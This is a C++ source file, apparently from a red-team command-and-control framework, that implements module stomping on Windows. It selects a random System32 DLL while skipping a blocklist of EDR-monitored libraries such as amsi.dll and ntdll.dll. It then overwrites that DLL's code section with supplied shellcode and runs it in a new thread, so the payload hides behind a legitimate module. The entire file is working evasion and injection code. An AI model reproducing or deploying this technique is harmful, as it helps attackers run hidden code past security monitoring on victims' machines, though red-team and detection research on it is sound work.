#ifdef _WIN32
#include <windows.h>
#include <intrin.h>
#include <cstring>
#include <string>
#include <vector>

namespace rtlc2 { namespace evasion {

// Find the .text section of a loaded DLL and return its address and size
static bool FindTextSection(HMODULE hMod, void** ppText, size_t* pSize) {
    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(hMod);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;

    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS*>(
        reinterpret_cast<uint8_t*>(hMod) + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

    auto* section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            *ppText = reinterpret_cast<uint8_t*>(hMod) + section[i].VirtualAddress;
            *pSize = section[i].Misc.VirtualSize;
            return true;
        }
    }
    return false;
}

// DLLs that are commonly monitored by EDR products or are critical
// system libraries. We must avoid stomping these.
static bool IsMonitoredDLL(const char* name) {
    const char* blocklist[] = {
        "ntdll.dll", "kernel32.dll", "kernelbase.dll",
        "amsi.dll", "clr.dll", "mscoree.dll",
        "user32.dll", "advapi32.dll", "sechost.dll",
        "bcrypt.dll", "ncrypt.dll", "crypt32.dll",
        "combase.dll", "rpcrt4.dll", "gdi32.dll",
        "win32u.dll", "msvcp_win.dll", "ucrtbase.dll",
    };
    for (auto* blocked : blocklist) {
        if (_stricmp(name, blocked) == 0) return true;
    }
    return false;
}

// Dynamically discover a suitable DLL for module stomping.
//
// Instead of a hardcoded list, we enumerate System32 DLLs at runtime
// and randomly select one that:
//   1. Is not in the blocklist of commonly-monitored DLLs
//   2. Has a file size large enough to contain the shellcode
//   3. Is not currently loaded in our process (to avoid side effects)
//
// Uses __rdtsc() for a non-deterministic seed to randomize selection,
// making the stomped module different on each execution.
std::string GetStompableDLL(size_t minSize) {
    // Default minimum size if caller doesn't specify
    if (minSize == 0) minSize = 65536; // 64 KB

    std::vector<std::string> qualified;

    WIN32_FIND_DATAA findData = {};
    HANDLE hFind = FindFirstFileA("C:\\Windows\\System32\\*.dll", &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        // Enumeration failed; fall back to known candidates
        goto fallback;
    }

    do {
        // Skip directories
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;

        // Skip monitored/critical DLLs
        if (IsMonitoredDLL(findData.cFileName)) continue;

        // Check file size (use low DWORD; System32 DLLs are < 4GB)
        DWORD fileSize = findData.nFileSizeLow;
        if (fileSize < (DWORD)minSize) continue;

        // Skip DLLs already loaded in our process (stomping a loaded
        // DLL could cause crashes if something references it)
        if (GetModuleHandleA(findData.cFileName) != nullptr) continue;

        // Build full path
        std::string fullPath = "C:\\Windows\\System32\\";
        fullPath += findData.cFileName;
        qualified.push_back(fullPath);

    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);

    if (!qualified.empty()) {
        // Random selection using rdtsc for non-deterministic seed
        unsigned long long tsc = __rdtsc();
        size_t idx = (size_t)(tsc % qualified.size());
        return qualified[idx];
    }

fallback:
    // Fallback to known DLLs if dynamic enumeration fails
    const char* fallbackCandidates[] = {
        "C:\\Windows\\System32\\xpsservices.dll",
        "C:\\Windows\\System32\\ColorAdapterClient.dll",
        "C:\\Windows\\System32\\cdp.dll",
        "C:\\Windows\\System32\\edputil.dll",
        "C:\\Windows\\System32\\chakra.dll",
    };
    for (auto* dll : fallbackCandidates) {
        if (GetFileAttributesA(dll) != INVALID_FILE_ATTRIBUTES) {
            return dll;
        }
    }
    return "C:\\Windows\\System32\\xpsservices.dll";
}

// Load a clean DLL and stomp its .text section with shellcode.
// The dllPath can be obtained from GetStompableDLL(shellcodeLen)
// to dynamically select a suitable DLL.
void* ModuleStomp(const std::string& dllPath, const void* shellcode, size_t shellcodeLen) {
    // Load with DONT_RESOLVE_DLL_REFERENCES to avoid DllMain execution
    HMODULE hMod = LoadLibraryExA(dllPath.c_str(), nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!hMod) return nullptr;

    void* pText = nullptr;
    size_t textSize = 0;
    if (!FindTextSection(hMod, &pText, &textSize)) {
        FreeLibrary(hMod);
        return nullptr;
    }

    if (shellcodeLen > textSize) {
        FreeLibrary(hMod);
        return nullptr; // Shellcode too large for .text section
    }

    // Make .text writable
    DWORD oldProtect;
    if (!VirtualProtect(pText, textSize, PAGE_READWRITE, &oldProtect)) {
        FreeLibrary(hMod);
        return nullptr;
    }

    // Zero the entire section first, then copy shellcode
    memset(pText, 0, textSize);
    memcpy(pText, shellcode, shellcodeLen);

    // Restore to executable
    VirtualProtect(pText, textSize, PAGE_EXECUTE_READ, &oldProtect);

    return pText;
}

// Execute code at the stomped address
bool ExecuteStompedModule(void* addr) {
    if (!addr) return false;

    HANDLE hThread = CreateThread(nullptr, 0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>(addr), nullptr, 0, nullptr);
    if (!hThread) return false;

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return true;
}

}} // namespace rtlc2::evasion

#else // POSIX

#include <string>

namespace rtlc2 { namespace evasion {
std::string GetStompableDLL(size_t) { return ""; }
void* ModuleStomp(const std::string&, const void*, size_t) { return nullptr; }
bool ExecuteStompedModule(void*) { return false; }
}} // namespace rtlc2::evasion

#endif
